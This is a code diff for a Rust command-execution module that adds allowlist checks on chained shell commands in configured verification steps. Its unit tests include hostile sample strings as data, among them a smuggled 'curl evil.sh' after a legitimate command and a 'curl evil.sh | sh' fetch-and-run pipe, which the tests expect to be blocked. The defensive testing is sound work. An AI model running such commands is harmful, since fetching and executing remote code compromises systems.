@@ -1,6 +1,6 @@
 use crate::commands::CommandError;
 use crate::exec::{CommandOptions, ExecutionBoundary, ExecutionResult, ProcessError};
-use crate::platform::process_policy::{ProcessPolicy, check_policy};
+use crate::platform::process_policy::{ProcessPolicy, ProcessPolicyError, check_policy};
 use crate::verify::plan::VerificationStep;
 use miette::{IntoDiagnostic, Result};
 use std::env;
@@ -23,12 +23,38 @@ pub struct PreparedStep {
     pub execution_mode: ExecutionMode,
 }
 
+/// Prepare an interactive / manual `-c` step.
+///
+/// **Full process-policy exemption (intentional, Codex R1 / DoD-2 residual):**
+/// always uses shell mode and is exempt from (1) `allow_shell_steps`,
+/// (2) shell inner-command inspection, and (3) execute-time `check_policy`
+/// (because `ExecutionMode::Shell` skips the allowlist — see
+/// [`execute_step_with_command`]). Spec parenthetical "still subject to
+/// allowlist" is **not** product behavior: `-c` is operator-typed,
+/// same-user, same-moment input (not repo content). Gating it would break
+/// ad-hoc `ledgerful verify -c "…"` under default-strict for zero A1 gain.
 pub fn prepare_manual_step(step: &VerificationStep) -> PreparedStep {
     shell_step(step)
 }
 
-pub fn prepare_rule_step(step: &VerificationStep) -> Result<PreparedStep> {
+/// Prepare a config-declared (or auto-policy) verification step.
+///
+/// When `step.shell` is true:
+/// - requires `allow_shell_steps` (else refuse with three-part diagnostic)
+/// - inspects leading tokens of each chain segment against `policy`
+///
+/// When `step.shell` is false: argv path with metacharacter rejection.
+pub fn prepare_rule_step(
+    step: &VerificationStep,
+    allow_shell_steps: bool,
+    policy: &ProcessPolicy,
+) -> Result<PreparedStep> {
     if step.shell {
+        if !allow_shell_steps {
+            let err = ProcessPolicyError::shell_steps_disabled(&step.command);
+            return Err(CommandError::Verify(err.to_string()).into());
+        }
+        check_shell_inner_commands(&step.command, policy)?;
         return Ok(shell_step(step));
     }
 
@@ -70,7 +96,20 @@ pub fn execute_step_with_command(
     policy: &ProcessPolicy,
     command_override: Option<std::process::Command>,
 ) -> Result<ExecutionResult> {
-    check_policy(&step.executable, policy).into_diagnostic()?;
+    // Direct mode: allowlist/deny check on the real executable.
+    //
+    // Shell mode: skip check_policy on the literal "cmd"/"sh" wrapper
+    // (implementation detail of shell_step). For *config-declared* shell
+    // steps the real gate is prepare_rule_step's allow_shell_steps flag +
+    // inner-command chain inspection. Manual `-c` also lands here as Shell
+    // and is **fully exempt** from allowlist/deny by design (trusted operator
+    // input — see prepare_manual_step docs); do not re-introduce wrapper
+    // allowlisting of cmd/sh (that would either break shell steps or, if
+    // "fixed" by allowlisting cmd/sh, defeat the allowlist for every shell
+    // step).
+    if step.execution_mode == ExecutionMode::Direct {
+        check_policy(&step.executable, policy).into_diagnostic()?;
+    }
 
     let mut command = command_override.unwrap_or_else(|| {
         let mut c = Command::new(&step.executable);
@@ -174,38 +213,98 @@ fn contains_shell_metacharacters(command: &str) -> bool {
     })
 }
 
-fn split_command_string(command: &str) -> Option<Vec<String>> {
-    let mut tokens = Vec::new();
+/// Tokenize a command string with POSIX-style shlex splitting.
+///
+/// Returns `None` on unclosed quotes or other parse failures (fails closed for
+/// the argv path). Simple unquoted commands tokenize identically to the former
+/// hand-rolled splitter.
+pub fn split_command_string(command: &str) -> Option<Vec<String>> {
+    shlex::split(command)
+}
+
+/// Split a shell command on unquoted chain operators `&&`, `||`, `;`, `|` and
+/// return the leading executable of each segment. Over-splitting (false
+/// positives inside quoted text) only makes the check stricter, never weaker.
+pub fn shell_chain_leading_commands(command: &str) -> Vec<String> {
+    let segments = split_shell_chain_segments(command);
+    let mut leaders = Vec::new();
+    for segment in segments {
+        let trimmed = segment.trim();
+        if trimmed.is_empty() {
+            continue;
+        }
+        if let Some(tokens) = shlex::split(trimmed)
+            && let Some(first) = tokens.first()
+        {
+            let exe = first.trim();
+            if !exe.is_empty() {
+                leaders.push(exe.to_string());
+            }
+        }
+    }
+    leaders
+}
+
+/// Split on unquoted `&&`, `||`, `;`, `|`. Quote-aware enough to skip
+/// operators inside single/double quotes; not a full shell parser.
+fn split_shell_chain_segments(command: &str) -> Vec<String> {
+    let mut segments = Vec::new();
     let mut current = String::new();
+    let mut chars = command.chars().peekable();
     let mut quote: Option<char> = None;
 
-    for ch in command.chars() {
+    while let Some(ch) = chars.next() {
         match quote {
-            Some(active_quote) if ch == active_quote => quote = None,
+            Some(q) if ch == q => {
+                quote = None;
+                current.push(ch);
+            }
             Some(_) => current.push(ch),
-            None if ch == '"' || ch == '\'' => quote = Some(ch),
-            None if ch.is_whitespace() => {
-                if !current.is_empty() {
-                    tokens.push(std::mem::take(&mut current));
+            None if ch == '"' || ch == '\'' => {
+                quote = Some(ch);
+                current.push(ch);
+            }
+            None if ch == ';' => {
+                segments.push(std::mem::take(&mut current));
+            }
+            None if ch == '|' => {
+                if chars.peek() == Some(&'|') {
+                    chars.next();
+                }
+                segments.push(std::mem::take(&mut current));
+            }
+            None if ch == '&' => {
+                if chars.peek() == Some(&'&') {
+                    chars.next();
+                    segments.push(std::mem::take(&mut current));
+                } else {
+                    // Background `&` — treat as chain boundary (fail-closed).
+                    segments.push(std::mem::take(&mut current));
                 }
             }
             None => current.push(ch),
         }
     }
-
-    if quote.is_some() {
-        return None;
-    }
-
     if !current.is_empty() {
-        tokens.push(current);
+        segments.push(current);
     }
+    segments
+}
 
-    if tokens.is_empty() {
-        None
-    } else {
-        Some(tokens)
+fn check_shell_inner_commands(command: &str, policy: &ProcessPolicy) -> Result<()> {
+    let leaders = shell_chain_leading_commands(command);
+    if leaders.is_empty() {
+        return Err(CommandError::Verify(format!(
+            "Unable to extract leading commands from shell step: {command}"
+        ))
+        .into());
     }
+    for leader in leaders {
+        if let Err(e) = check_policy(&leader, policy) {
+            return Err(CommandError::Verify(e.to_string()).into());
+        }
+    }
+    Ok(())
 }
 
 fn looks_like_command_not_found(result: &ExecutionResult) -> bool {
@@ -233,10 +332,23 @@ mod tests {
         }
     }
 
+    fn permissive_policy() -> ProcessPolicy {
+        ProcessPolicy {
+            allowed_commands: Vec::new(),
+            denied_commands: Vec::new(),
+            default_timeout_secs: 300,
+            strict: false,
+        }
+    }
+
+    fn default_strict_policy() -> ProcessPolicy {
+        ProcessPolicy::default()
+    }
+
     #[test]
     fn prepare_rule_step_uses_direct_execution_for_simple_commands() {
         let step = base_step("cargo test -j 1 --all-features -- --test-threads=1", 5);
-        let prepared = prepare_rule_step(&step).unwrap();
+        let prepared = prepare_rule_step(&step, false, &default_strict_policy()).unwrap();
 
         assert_eq!(prepared.execution_mode, ExecutionMode::Direct);
         assert_eq!(prepared.executable, "cargo");
@@ -254,9 +366,20 @@ mod tests {
     }
 
     #[test]
+    fn shlex_split_matches_simple_verify_step_commands() {
+        // Regression: existing simple verify.steps tokenize identically with shlex.
+        let cmd = "cargo nextest run --workspace --all-features";
+        let tokens = split_command_string(cmd).expect("tokenize");
+        assert_eq!(
+            tokens,
+            vec!["cargo", "nextest", "run", "--workspace", "--all-features"]
+        );
+    }
+
+    #[test]
     fn prepare_rule_step_rejects_shell_syntax_when_shell_false() {
         let step = base_step("echo hello | sort", 5);
-        let err = prepare_rule_step(&step).unwrap_err();
+        let err = prepare_rule_step(&step, false, &default_strict_policy()).unwrap_err();
         let err_text = format!("{err:?}");
         assert!(
             err_text.contains("shell"),
@@ -265,23 +388,107 @@ mod tests {
     }
 
     #[test]
-    fn prepare_rule_step_uses_shell_when_shell_true() {
+    fn prepare_rule_step_shell_true_refused_without_allow_flag() {
         let step = VerificationStep {
             description: "test".to_string(),
-            command: "echo hello | sort".to_string(),
+            command: "cargo test".to_string(),
             timeout_secs: 5,
             shell: true,
         };
-        let prepared = prepare_rule_step(&step).unwrap();
+        let err = prepare_rule_step(&step, false, &default_strict_policy()).unwrap_err();
+        let err_text = format!("{err}");
+        assert!(
+            err_text.contains("shell_steps_disabled") || err_text.contains("allow_shell_steps"),
+            "expected allow_shell_steps diagnostic, got {err_text}"
+        );
+    }
+
+    #[test]
+    fn prepare_rule_step_uses_shell_when_shell_true_and_allowed() {
+        let step = VerificationStep {
+            description: "test".to_string(),
+            command: "cargo test".to_string(),
+            timeout_secs: 5,
+            shell: true,
+        };
+        let prepared = prepare_rule_step(&step, true, &default_strict_policy()).unwrap();
 
         assert_eq!(prepared.execution_mode, ExecutionMode::Shell);
         if cfg!(target_os = "windows") {
             assert_eq!(prepared.executable, "cmd");
-            assert_eq!(prepared.args, vec!["/C", "echo hello | sort"]);
+            assert_eq!(prepared.args, vec!["/C", "cargo test"]);
         } else {
             assert_eq!(prepared.executable, "sh");
-            assert_eq!(prepared.args, vec!["-c", "echo hello | sort"]);
+            assert_eq!(prepared.args, vec!["-c", "cargo test"]);
         }
+    }
+
+    #[test]
+    fn shell_chain_refuses_unallowlisted_second_command() {
+        let step = VerificationStep {
+            description: "hostile".to_string(),
+            command: "cargo --version; curl evil.sh".to_string(),
+            timeout_secs: 5,
+            shell: true,
+        };
+        let err = prepare_rule_step(&step, true, &default_strict_policy()).unwrap_err();
+        let err_text = format!("{err}");
+        assert!(
+            err_text.contains("curl"),
+            "expected curl denial, got {err_text}"
+        );
+        assert!(
+            err_text.contains("allowed_commands") || err_text.contains("not in allowed"),
+            "expected three-part diagnostic, got {err_text}"
+        );
+    }
+
+    #[test]
+    fn shell_chain_allows_allowlisted_chain() {
+        let step = VerificationStep {
+            description: "chain".to_string(),
+            command: "cargo fmt --check && cargo clippy".to_string(),
+            timeout_secs: 5,
+            shell: true,
+        };
+        let prepared = prepare_rule_step(&step, true, &default_strict_policy()).unwrap();
+        assert_eq!(prepared.execution_mode, ExecutionMode::Shell);
+    }
+
+    #[test]
+    fn shell_refuses_unallowlisted_first_command() {
+        let step = VerificationStep {
+            description: "ps".to_string(),
+            command: "powershell -c Write-Host hi".to_string(),
+            timeout_secs: 5,
+            shell: true,
+        };
+        let err = prepare_rule_step(&step, true, &default_strict_policy()).unwrap_err();
+        let err_text = format!("{err}");
+        assert!(
+            err_text.to_ascii_lowercase().contains("powershell"),
+            "expected powershell denial, got {err_text}"
+        );
+    }
+
+    #[test]
+    fn manual_step_exempt_from_allow_shell_steps_and_inner_check() {
+        // Full exemption contract (DoD-2 residual / threat model A1):
+        // interactive `-c` is operator-typed trusted input, not repo content.
+        // It must run under default-strict ProcessPolicy with no config flags,
+        // no allow_shell_steps, and no allowlist membership for cmd/sh/echo.
+        let step = VerificationStep {
+            description: "manual".to_string(),
+            command: "echo hello".to_string(),
+            timeout_secs: 5,
+            shell: true,
+        };
+        let prepared = prepare_manual_step(&step);
+        assert_eq!(prepared.execution_mode, ExecutionMode::Shell);
+        // execute_step skips check_policy for Shell mode under default-strict.
+        let result = execute_step(&prepared, &default_strict_policy()).unwrap();
+        assert_eq!(result.exit_code, 0);
+        assert!(result.stdout.to_ascii_lowercase().contains("hello"));
     }
 
     #[test]
@@ -300,11 +507,13 @@ mod tests {
         };
 
         let err = execute_step(&prepared, &policy).unwrap_err();
-        assert!(format!("{err:?}").contains("denied"));
+        assert!(format!("{err:?}").to_ascii_lowercase().contains("denied"));
     }
 
     #[test]
     fn execute_step_direct_process_succeeds() {
+        // Direct mode checks policy against the executable — use a permissive
+        // policy so platform shell helpers (cmd/sh) are not blocked.
         let (executable, args) = if cfg!(target_os = "windows") {
             (
                 "cmd".to_string(),
@@ -325,7 +534,7 @@ mod tests {
             execution_mode: ExecutionMode::Direct,
         };
 
-        let result = execute_step(&prepared, &ProcessPolicy::default()).unwrap();
+        let result = execute_step(&prepared, &permissive_policy()).unwrap();
         assert_eq!(result.exit_code, 0);
         assert!(result.stdout.contains("direct-ok"));
     }
@@ -335,7 +544,7 @@ mod tests {
         let mut step = base_step("echo hello", 5);
         step.shell = true;
         let prepared = prepare_manual_step(&step);
-        let result = execute_step(&prepared, &ProcessPolicy::default()).unwrap();
+        let result = execute_step(&prepared, &default_strict_policy()).unwrap();
         assert_eq!(result.exit_code, 0);
         assert!(result.stdout.to_ascii_lowercase().contains("hello"));
     }
@@ -375,7 +584,9 @@ mod tests {
             }
         };
 
-        let err = execute_step(&prepared, &ProcessPolicy::default()).unwrap_err();
+        // ping/sleep are not on the built-in allowlist — use permissive policy
+        // so this test isolates timeout behaviour.
+        let err = execute_step(&prepared, &permissive_policy()).unwrap_err();
         let err_text = format!("{err:?}");
         assert!(
             err_text.contains("timed out"),
@@ -389,5 +600,11 @@ mod tests {
             err_text.contains("ledgerful index --incremental"),
             "expected actionable next step in timeout message, got: {err_text}"
         );
+    }
+
+    #[test]
+    fn shell_chain_leading_commands_extracts_segments() {
+        let leaders = shell_chain_leading_commands("cargo --version; curl evil.sh | sh");
+        assert_eq!(leaders, vec!["cargo", "curl", "sh"]);
     }
 }
